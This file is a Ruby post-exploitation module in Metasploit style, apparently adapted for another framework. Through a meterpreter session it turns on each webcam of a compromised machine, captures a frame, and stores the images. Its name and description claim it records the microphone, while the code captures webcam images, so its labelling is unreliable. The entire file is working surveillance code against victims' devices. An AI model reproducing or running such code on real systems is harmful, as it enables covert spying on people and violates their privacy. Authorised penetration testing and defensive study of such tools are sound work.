##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
            update_info(
                    info,
                    'Name'         => 'Multi Manage Record Microphone',
                    'Description'  => %q{
          This module will enable and record your target's microphone.
          For non-Windows targets, please use Java meterpreter to be
          able to use this feature.
        },
                    'License'      => MSF_LICENSE,
                    'Author'       => ['sinn3r'],
                    'Platform'     => %w{linux osx win},
                    'SessionTypes' => ['meterpreter'],
                    'Compat'       => {
                            'Meterpreter' => {
                                    'Commands' => %w[
              stdapi_webcam_*
            ]
                            }
                    }
            )
    )

  end

  def run
    result = {}
    session.webcam.webcam_list.each_with_index do |name, indx|
      begin
        session.webcam.webcam_start(indx + 1)
        webcam_started = true
        data = session.webcam.webcam_get_frame(50)
        filename  = "#{Time.now.strftime("%Y-%m-%d-%H-%M-%S")}_#{indx + 1}_camera.jpg"
        full_path = store_viper(data, filename)
        result[name] = filename
        Rex.sleep(2)
      ensure
        client.webcam.webcam_stop if webcam_started
      end
    end
    pub_json_result(true,
                    nil,
                    result,
                    self.uuid)
  end
end
